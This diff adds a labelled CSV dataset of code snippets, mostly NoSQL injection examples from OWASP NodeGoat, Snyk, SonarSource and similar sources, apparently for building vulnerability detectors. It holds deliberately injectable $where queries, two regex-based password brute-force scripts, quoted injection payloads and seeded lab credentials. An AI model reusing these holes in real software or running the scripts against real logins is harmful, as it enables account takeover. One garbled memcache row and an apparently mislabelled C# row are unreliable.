@@ -1,0 +1,699 @@
+code,target,source,link
+$query = array('$where' => 'this.name === \''.$name.'\'');,1,Acunetix,https://www.acunetix.com/blog/web-security-zone/nosql-injections/
+"BasicDBObject query = (BasicDBObject) BasicDBObjectBuilder
+                .start(""$where"", ""this.sharedWith == \"""" + userName + ""\"" && this.email == \"""" + email + ""\"""")
+                .get();
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",1,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"BasicDBObject query = new BasicDBObject();
+query.append(""sharedWith"", userName);
+query.append(""email"", email);
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"HashMap<String, String> paramMap = new HashMap<>();
+paramMap.put(""$where"", ""this.sharedWith == \"""" + userName + ""\"" && this.email == \"""" + email + ""\"""");
+BasicDBObject query = new BasicDBObject(paramMap);
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",1,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"BasicDBObject query = new BasicDBObject(""$where"",""this.sharedWith == \"""" + userName + ""\"" && this.email == \"""" + email + ""\"""");
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",1,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"<!DOCTYPE html>
+<html>
+ <head>
+  <title>User Profile Lookup</title>
+ </head>
+ <body>
+  <?php
+  if (isset($_GET['usersearch']) && !empty($_GET['usersearch'])) {
+   try {
+   $result = """";
+   $conn = new MongoClient('mongodb://127.0.0.1');
+   $db = $conn->appUserData;
+    $collection = $db->users;
+    $search = $_GET['usersearch'];
+    $js = ""function () { var query = '"". $usersearch . ""'; return this.username == query;}"";
+    print $js;
+    print '<br/>';
+  
+   $cursor = $collection->find(array('$where' => $js));
+   echo $cursor->count() . ' user found. <br/>';
+  
+   foreach ($cursor as $obj) {
+     echo 'Name: ' . $obj['name'] . '<br/>';
+     echo 'Username: ' . $obj['username'] . '<br/>';
+     echo 'Email: ' . $obj['email'] . '<br/>';
+     echo '<br/>';
+   }
+  
+ $conn->close();
+ } catch (MongoConnectionException $e) {
+  die('Error connecting to MongoDB server : ' . $e->getMessage());
+ } catch (MongoException $e) {
+  die('Error: ' . $e->getMessage());
+ }
+ }
+ ?>
+
+
+  <b>Enter your username:</b><br>
+  <form method=""get"" id=""usersearch"">
+   <p>Search <input type=""text"" name=""usersearch"" id=""usersearch"" /> <input type=""submit"" name=""submitbutton""
+     value=""Submit"" /></p>
+  </form>
+  <div id=""results"">
+   <?php echo $result; ?>
+  </div>
+ </body>
+</html>",1,GitHub,https://github.com/codingo/NoSQLMap/blob/master/vuln_apps/src/acct.php
+"const AllocationsDAO = require(""../data/allocations-dao"").AllocationsDAO;
+const {
+    environmentalScripts
+} = require(""../../config/config"");
+
+function AllocationsHandler(db) {
+    ""use strict"";
+
+    const allocationsDAO = new AllocationsDAO(db);
+
+    this.displayAllocations = (req, res, next) => {
+        /*
+        // Fix for A4 Insecure DOR -  take user id from session instead of from URL param
+        const { userId } = req.session;
+        */
+        const {
+            userId
+        } = req.params;
+        const {
+            threshold
+        } = req.query;
+
+        allocationsDAO.getByUserIdAndThreshold(userId, threshold, (err, allocations) => {
+            if (err) return next(err);
+            return res.render(""allocations"", {
+                userId,
+                allocations,
+                environmentalScripts
+            });
+        });
+    };
+}
+
+module.exports = AllocationsHandler;",1,GitHub,https://github.com/OWASP/NodeGoat/blob/master/app/routes/allocations.js
+"HashMap<String, String> paramMap = new HashMap<>();
+        paramMap.put(""sharedWith"", userName);
+        paramMap.put(""email"", email);
+        BasicDBObject query = (BasicDBObject) BasicDBObjectBuilder
+            .start(paramMap)
+            .get();
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"import memcache 
+mc = memcache.Client([lecalkost:11211'], debug=0) 
+key = input(""Enter the key to retrieye from Memcached: "") 
+value = mc.get(key) 
+
+if value is not None: 
+             print(f The value of key '{key)' is '{value)."") 
+else: 
+             print(""Error: Key not found."")",1,SecOps,https://secops.group/a-pentesters-guide-to-nosql-injection/
+"<?php
+$con = new MongoDB\Driver\Manager(“mongodb://localhost:27017”);
+if(isset($_POST['user']) && isset($_POST['pass'])){
+  $user = $_POST['user'];
+  $pass = $_POST['pass'];
+  $q = new MongoDB\Driver\Query(['username' => $user, 'password' => $pass]);
+  $record = $con->executeQuery('myapp.login', $q);
+  $record = iterator_to_array($record);
+  if(sizeof($record) > 0){
+    session_start();
+    $_SESSION['loggedin'] = true;
+    $_SESSION['uid'] = $record[0]->username;
+    header('Location: /sekr3tPl4ce.php');
+    die();
+  }
+}
+header('Location: /?err=1');",1,Medium,https://anas0x1.medium.com/whats-nosql-injection-and-how-to-exploit-it-6acad517d50e
+"BasicDBObject query = (BasicDBObject) BasicDBObjectBuilder
+                .start()
+                .append(""$where"", ""this.sharedWith == \"""" + userName + ""\"" && this.email == \"""" + email + ""\"""")
+                .get();
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",1,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username=""admin""
+password=""""
+u=""http://example.org/login""
+headers={'content-type': 'application/x-www-form-urlencoded'}
+
+while True:
+    for c in string.printable:
+        if c not in ['*','+','.','?','|','&','$']:
+            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
+            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
+            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
+                print(""Found one more char : %s"" % (password+c))
+                password += c
+",1,GitLab,https://gitlab.com/pentest-tools/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass
+"import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username=""admin""
+password=""""
+u=""http://example.org/login""
+headers={'content-type': 'application/json'}
+
+while True:
+    for c in string.printable:
+        if c not in ['*','+','.','?','|']:
+            payload='{""username"": {""$eq"": ""%s""}, ""password"": {""$regex"": ""^%s"" }}' % (username, password + c)
+            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
+            if 'OK' in r.text or r.status_code == 302:
+                print(""Found one more char : %s"" % (password+c))
+                password += c
+",1,GitLab,https://gitlab.com/pentest-tools/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass
+"namespace App\Http\Controllers;
+
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\DB;
+
+class UserController extends Controller
+{
+    public function authenticate(Request $request)
+    {
+        $user = $request->input('user');
+        $pass = $request->input('pass');
+
+        $user_exists = DB::table('users')
+                        ->where('user', $user)
+                        ->where('pass', $pass)
+                        ->exists();
+
+        if (!$user_exists)
+        {
+            abort(401);
+        }
+
+        return view('authenticated.index');
+    }
+}",0,SonarSource,https://rules.sonarsource.com/php/RSPEC-3649/
+"from flask import request
+import sqlalchemy
+
+@app.route('/example')
+def get_users():
+    user = request.args[""user""]
+    conn = sqlalchemy.create_engine(connection_string)
+    metadata = sqlalchemy.MetaData(bind=conn, reflect=True)
+    users = metadata.tables['users']
+    conn = engine.connect()
+
+    sql = users.select().where(users.c.user == user)
+    conn.execute(sql)",0,SonarSource,https://rules.sonarsource.com/python/RSPEC-3649/?search=inject
+"query = 'function() {var search_year = \'' . 
+$_GET['year'] . '\';' . 
+'return this.publicationYear == search_year || ' . 
+'       this.filmingYear == search_year || ' . 
+'       this.recordingYear == search_year;}'; 
+$cursor = $collection->find(array('$where' => $query));",1,Blackhat,https://media.blackhat.com/bh-us-11/Sullivan/BH_US_11_Sullivan_Server_Side_WP.pdf
+"userRoutes.route('/search').post(function(req, res) {
+    let search = req.query.search;
+    let query = { $where: `this.plants == '${search}'` }
+        db.collection('plants').find(query, function (err, users) {
+            if (err) {
+                res.json(err);
+            } else {
+                res.render('plants', { title: 'Plants', plants: plants });
+            }
+        });
+});",1,Snyk,https://learn.snyk.io/lesson/nosql-injection-attack/
+"userRoutes.route('/search').post(function(req, res) {
+    let search = String(req.query.search);
+    let query = {plants: search}
+ 
+    db.collection('plants').find(query, function (err, plants) {
+        if (err) {
+            res.json(err);
+        } else {
+            res.render('plants', { title: 'Plants', plants: plants });
+        }
+    });
+});",0,Snyk,https://learn.snyk.io/lesson/nosql-injection-attack/
+"using Microsoft.AspNetCore.Mvc;
+using MongoDB.Driver;
+using System.Collections.Generic;
+using System.Threading.Tasks;
+using YourNamespace.Models; // Replace with your actual namespace and models
+
+[Route(""api/[controller]"")]
+[ApiController]
+public class PlantController : ControllerBase {
+    private readonly IMongoCollection<Plant> _plants;
+
+    public PlantController(IMongoDatabase database) {
+        _plants = database.GetCollection<Plant>(""plants"");
+    }
+
+    [HttpPost(""search"")]
+    public async Task<IActionResult> SearchPlants([FromQuery] string search) {
+        try {
+            var filter = Builders<Plant>.Filter.Eq(p => p.Name, search); // Assuming 'Name' is a field in 'Plant'
+            var plants = await _plants.Find(filter).ToListAsync();
+
+            // For API, typically return JSON, but you can modify as needed
+            return Ok(plants);
+        } catch (System.Exception ex) {
+            return StatusCode(500, ex.Message); // Internal Server Error
+        }
+    }
+}
+
+public class Plant {
+    public string Name { get; set; }
+    // Other properties...
+}",1,Snyk,https://learn.snyk.io/lesson/nosql-injection-attack/
+"HashMap<String, String> paramMap = new HashMap<>();
+        paramMap.put(""$where"", ""this.sharedWith == \"""" + userName + ""\"" && this.email == \"""" + email + ""\"""");
+        BasicDBObject query = (BasicDBObject) BasicDBObjectBuilder
+                .start(paramMap)
+                .get();
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",1,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"$msg = $_GET['msg'];
+$v8 = new V8Js();
+$v8->executeString(""var msg = '$msg'; ..SOME CODE.."");",1,SyHunt,https://www.syhunt.com/en/?n=Articles.NoSQLInjection
+"$username = $_POST['username'];
+$password = $_POST['password'];
+$connection = new MongoDB\Client('mongodb://localhost:27017');
+if($connection) {
+ $db = $connection->test;
+ $users = $db->users;
+ $query = array(
+  ""user"" => $username,
+  ""password"" => $password
+ );
+ $req = $users->findOne($query);
+}
+",1,Invicti,https://www.invicti.com/learn/nosql-injection/
+"const express = require('express');
+const app = express();
+const defaultRoutes = express.Router();
+
+let User = require('../models/User');
+let Config = require('../models/Config');
+let Product = require('../models/Product');
+
+defaultRoutes.route('/').get(function(req, res) {
+    res.render('index', {
+        title: 'Home',
+        message: 'A Vulnerable Node & Mongo App'
+    })
+});
+
+defaultRoutes.route('/reset').get(async function(req, res) {
+    const db = req.app.locals.db;
+
+    if (!db) {
+        console.error(""Database connection is not set up correctly."");
+        return res.render('reset', {
+            title: 'Reset DB',
+            message: 'Database connection error.'
+        });
+    }
+
+    const dropAllCollections = async () => {
+        try {
+            const collections = await db.listCollections().toArray();
+            console.log(""Collections found:"", collections.length);
+
+            for (const collection of collections) {
+                console.log(""Found collection:"", collection.name);
+                if (!['configs', 'products', 'users'].includes(collection.name)) {
+                    await db.dropCollection(collection.name);
+                    console.log(`Collection ${collection.name} has been dropped.`);
+                }
+            }
+        } catch (err) {
+            console.error(""Error dropping collections:"", err);
+            throw err;
+        }
+    };
+
+    try {
+        await dropAllCollections();
+    } catch (err) {
+        res.render('reset', {
+            title: 'Reset DB',
+            message: 'Error has occurred during the reset process.'
+        });
+        console.error(err);
+        return;
+    }
+
+    try {
+        await Config.deleteMany({});
+        console.log(""Configs have been removed."");
+        await Product.deleteMany({});
+        console.log(""Products have been removed."");
+        await User.deleteMany({});
+        console.log(""Users have been removed."");
+
+        let users = [
+            {
+                username: ""guest"",
+                password: ""password"",
+                first_name: """",
+                last_name: """",
+                role: ""guest"",
+                email: ""guest@nullsweep.com"",
+                locked: false,
+                resetPasswordToken: """"
+            },
+            {
+                username: ""admin"",
+                password: ""2TR6uTRAuMUr5vARs9fYgdqY"",
+                first_name: """",
+                last_name: """",
+                role: ""admin"",
+                email: ""admin@nullsweep.com"",
+                locked: false,
+                resetPasswordToken: ""swrtwaqqq225q222122112""
+            },
+            {
+                username: ""carlos"",
+                password: ""abc123"",
+                first_name: ""Scary"",
+                last_name: ""Ghost"",
+                role: ""user"",
+                email: ""ghost@mailinator.com"",
+                locked: true,
+                resetPasswordToken: ""iioldsgiaioaiejiejirj0ifgsi""
+            },
+            {
+                username: ""jsmith"",
+                password: ""SuPeRsEcR3T"",
+                first_name: ""John"",
+                last_name: ""Smoth"",
+                role: ""user"",
+                email: ""jsmith@gmail.com"",
+                locked: false,
+                resetPasswordToken: """"
+            },
+            {
+                username: ""angryPrism58736"",
+                password: ""L1g7tM3Up!"",
+                first_name: ""Gary"",
+                last_name: ""Jorgen"",
+                role: ""user"",
+                email: ""prismman@yahoo.com"",
+                locked: false,
+                resetPasswordToken: ""kmkkqjneufouigfjaiuef""
+            }
+        ];
+
+        for (let user of users) {
+            let u = new User(user);
+            await u.save();
+            console.log(""added user "" + u.username);
+        }
+
+        let configs = [
+            {
+                name: ""apiClientKey"",
+                value: ""myclientname""
+            },
+            {
+                name: ""apiSecretKey"",
+                value: ""S3cr3tIsHERE!""
+            },
+            {
+                name: ""internalName"",
+                value: ""internetsecret.local""
+            }
+        ];
+
+        for (let config of configs) {
+            let c = new Config(config);
+            await c.save();
+            console.log(""added config "" + c.name);
+        }
+
+        let products = [
+            {
+                name: ""Apple Juice"",
+                category: ""soft"",
+                released: true,
+                quantity: 30
+            },
+            {
+                name: ""Orange Juice"",
+                category: ""soft"",
+                released: true,
+                quantity: 100
+            },
+            {
+                name: ""Coke"",
+                category: ""fizzy"",
+                released: true,
+                quantity: 50
+            },
+            {
+                name: ""Golden Bear"",
+                category: ""alcohol"",
+                released: false,
+                quantity: 1
+            }
+        ];
+
+        for (let product of products) {
+            let p = new Product(product);
+            await p.save();
+            console.log(""added product "" + p.name);
+        }
+
+        res.render('reset', {
+            title: 'Reset DB',
+            message: 'Added ' + users.length + ' users, and ' + configs.length + ' configs, and ' + products.length + ' products.'
+        });
+    } catch (err) {
+        res.render('reset', {
+            title: 'Reset DB',
+            message: 'Error has occurred'
+        });
+        console.error(err);
+    }
+});
+
+module.exports = defaultRoutes;",1,GitHub,https://github.com/irsdl/vulnerable-node-app
+"$msg = $_GET['msg'];
+$v8 = new V8Js();
+$JS = <<< EOT
+len = print($msg + ""\\n"");
+..SOME CODE..
+EOT;
+
+$v8->executeString($JS, 'basic.js');",1,SyHunt,https://www.syhunt.com/en/?n=Articles.NoSQLInjection
+" @app.route('/login')
+def login():
+    dynamodb = AWS_SESSION.client('dynamodb')
+
+    username = request.args[""username""]
+    password = request.args[""password""]
+
+    dynamodb.query(
+        KeyConditionExpression= ""username = :u"",
+        FilterExpression= ""password = :p"",
+        ExpressionAttributeValues={
+            "":u"": { 'S': username },
+            "":p"": { 'S': password }
+        },
+        TableName=""users"",
+        ProjectionExpression=""username""
+    )",0,SonarSource,https://rules.sonarsource.com/python/?search=nosql
+"import com.mongodb.MongoClient;
+import com.mongodb.DB;
+import com.mongodb.DBCollection;
+import com.mongodb.BasicDBObject;
+
+protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws UnknownHostException
+{
+    String input = req.getParameter(""input"");
+
+    MongoClient mongoClient = new MongoClient();
+    DB database             = mongoClient.getDB(""ExampleDatabase"");
+    DBCollection collection = database.getCollection(""exampleCollection"");
+    BasicDBObject query     = new BasicDBObject();
+
+    query.append(""field"", input);
+
+    collection.find(query);
+}",0,SonarSource,https://rules.sonarsource.com/java/type/Vulnerability/RSPEC-5147/
+"db.collection.find( { $where: function() { 
+    return (this.name == $userData) } } );",1,Invicti,https://www.invicti.com/blog/web-security/what-is-nosql-injection/
+"const UserDAO = require(""./user-dao"").UserDAO;
+
+/* The AllocationsDAO must be constructed with a connected database object */
+const AllocationsDAO = function(db){
+
+    ""use strict"";
+
+    /* If this constructor is called without the ""new"" operator, ""this"" points
+     * to the global object. Log a warning and call it correctly. */
+    if (false === (this instanceof AllocationsDAO)) {
+        console.log(""Warning: AllocationsDAO constructor called without 'new' operator"");
+        return new AllocationsDAO(db);
+    }
+
+    const allocationsCol = db.collection(""allocations"");
+    const userDAO = new UserDAO(db);
+
+    this.update = (userId, stocks, funds, bonds, callback) => {
+        const parsedUserId = parseInt(userId);
+
+        // Create allocations document
+        const allocations = {
+            userId: userId,
+            stocks: stocks,
+            funds: funds,
+            bonds: bonds
+        };
+
+        allocationsCol.update({
+            userId: parsedUserId
+        }, allocations, {
+            upsert: true
+        }, err => {
+
+            if (!err) {
+
+                console.log(""Updated allocations"");
+
+                userDAO.getUserById(userId, (err, user) => {
+
+                    if (err) return callback(err, null);
+
+                    // add user details
+                    allocations.userId = userId;
+                    allocations.userName = user.userName;
+                    allocations.firstName = user.firstName;
+                    allocations.lastName = user.lastName;
+
+                    return callback(null, allocations);
+                });
+            }
+
+            return callback(err, null);
+        });
+    };
+
+    this.getByUserIdAndThreshold = (userId, threshold, callback) => {
+        const parsedUserId = parseInt(userId);
+
+        const searchCriteria = () => {
+
+            if (threshold) {
+                /*
+                // Fix for A1 - 2 NoSQL Injection - escape the threshold parameter properly
+                // Fix this NoSQL Injection which doesn't sanitze the input parameter 'threshold' and allows attackers
+                // to inject arbitrary javascript code into the NoSQL query:
+                // 1. 0';while(true){}'
+                // 2. 1'; return 1 == '1
+                // Also implement fix in allocations.html for UX.                             
+                const parsedThreshold = parseInt(threshold, 10);
+                
+                if (parsedThreshold >= 0 && parsedThreshold <= 99) {
+                    return {$where: `this.userId == ${parsedUserId} && this.stocks > ${parsedThreshold}`};
+                }
+                throw `The user supplied threshold: ${parsedThreshold} was not valid.`;
+                */
+                return {
+                    $where: `this.userId == ${parsedUserId} && this.stocks > '${threshold}'`
+                };
+            }
+            return {
+                userId: parsedUserId
+            };
+        };
+
+        allocationsCol.find(searchCriteria()).toArray((err, allocations) => {
+            if (err) return callback(err, null);
+            if (!allocations.length) return callback(""ERROR: No allocations found for the user"", null);
+
+            let doneCounter = 0;
+            const userAllocations = [];
+
+            allocations.forEach( alloc => {
+                userDAO.getUserById(alloc.userId, (err, user) => {
+                    if (err) return callback(err, null);
+
+                    alloc.userName = user.userName;
+                    alloc.firstName = user.firstName;
+                    alloc.lastName = user.lastName;
+
+                    doneCounter += 1;
+                    userAllocations.push(alloc);
+
+                    if (doneCounter === allocations.length) {
+                        callback(null, userAllocations);
+                    }
+                });
+            });
+        });
+    };
+
+};
+
+module.exports.AllocationsDAO = AllocationsDAO;",1,GitHub,https://github.com/OWASP/NodeGoat/blob/master/app/routes/allocations.js
+"BasicDBObject query = new BasicDBObject(""sharedWith"", userName);
+query.append(""email"", email);
+
+MongoCursor<Document> cursor = collection.find(query).iterator();",0,GitHub,https://github.com/aabashkin/nosql-injection-vulnapp
+"#include <mongocxx/client.hpp>
+#include <mongocxx/instance.hpp>
+#include <bsoncxx/builder/stream/document.hpp>
+#include <iostream>
+#include <string>
+
+// Hypothetical function to simulate receiving user input
+std::string GetUserInput();
+
+int main() {
+    mongocxx::instance instance{};
+    mongocxx::client client{mongocxx::uri{}};
+
+    auto collection = client[""mydatabase""][""plants""];
+
+    std::string search = GetUserInput(); // Simulate getting search input from user
+
+    bsoncxx::builder::stream::document filter_builder;
+    filter_builder << ""$where"" << (""this.plants == '"" + search + ""'"");
+
+    auto cursor = collection.find(filter_builder.view());
+
+    // Process the cursor (e.g., displaying the plants)
+    // ...
+
+    return 0;
+}",1,Snyk,https://learn.snyk.io/lesson/nosql-injection-attack/
+"    public List<String> findUsers(String user, String pass) throws Exception {
+       String query = ""SELECT userid FROM users WHERE username = ? AND password = ?"";
+       try (PreparedStatement statement = connection.prepareStatement(query)) {
+           statement.setString(1, user);
+           statement.setString(2, pass);
+           ResultSet resultSet = statement.executeQuery(query);
+           List<String> users = new ArrayList<>();
+           while (resultSet.next()) {
+               users.add(resultSet.getString(0));
+           }
+
+           return users;
+       }
+    }",0,SonarSource,https://www.sonarsource.com/blog/top-security-flaws-hiding-in-your-code-right-now-and-how-to-fix-them/
